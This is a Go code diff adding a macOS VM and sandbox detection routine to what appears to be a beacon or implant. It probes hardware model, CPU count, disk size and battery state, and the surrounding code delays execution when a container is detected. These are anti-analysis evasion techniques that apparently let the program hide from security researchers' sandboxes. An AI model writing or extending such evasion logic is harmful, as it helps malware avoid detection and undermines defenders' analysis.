@@ -160,6 +160,48 @@ func phase3(p *beacon.TargetProfile) {
 	}
 }
 
+// phase4 detects VM and sandbox environments on macOS.
+func phase4(p *beacon.TargetProfile) {
+	out, _ := shell.Run("sysctl -n hw.model 2>/dev/null", 5e9)
+	model := strings.ToLower(strings.TrimSpace(out))
+	vmModels := map[string]string{
+		"virtualbox":  "VirtualBox",
+		"vmware":      "VMware",
+		"bochs":       "Bochs",
+		"parallels":   "Parallels",
+	}
+	for substr, vendor := range vmModels {
+		if strings.Contains(model, substr) {
+			p.IsVM = true
+			p.VMVendor = vendor
+			break
+		}
+	}
+
+	out, _ = shell.Run("sysctl -n hw.logicalcpu 2>/dev/null", 5e9)
+	fmt.Sscanf(out, "%d", &p.CPUCount)
+	if p.CPUCount < 2 {
+		p.IsSandbox = true
+		p.Hints = append(p.Hints, fmt.Sprintf("low cpu count: %d", p.CPUCount))
+	}
+
+	out, _ = shell.Run("diskutil info / 2>/dev/null | grep 'Disk Size' | awk '{print $3}'", 5e9)
+	var diskBytes int64
+	fmt.Sscanf(out, "%d", &diskBytes)
+	if diskBytes > 0 {
+		p.DiskSizeGB = diskBytes / 1000 / 1000 / 1000
+		if p.DiskSizeGB < 100 {
+			p.Hints = append(p.Hints, fmt.Sprintf("small disk: %dGB", p.DiskSizeGB))
+		}
+	}
+
+	out, _ = shell.Run("pmset -g batt 2>/dev/null | head -1", 5e9)
+	p.HasBattery = strings.Contains(out, "Battery")
+	if !p.HasBattery {
+		p.Hints = append(p.Hints, "no battery detected")
+	}
+}
+
 func QuickCheck() (threatLevel string, initialDelay time.Duration) {
 	if os.Getenv("DOCKER_HOST") != "" || os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
 		return "medium", 90 * time.Second
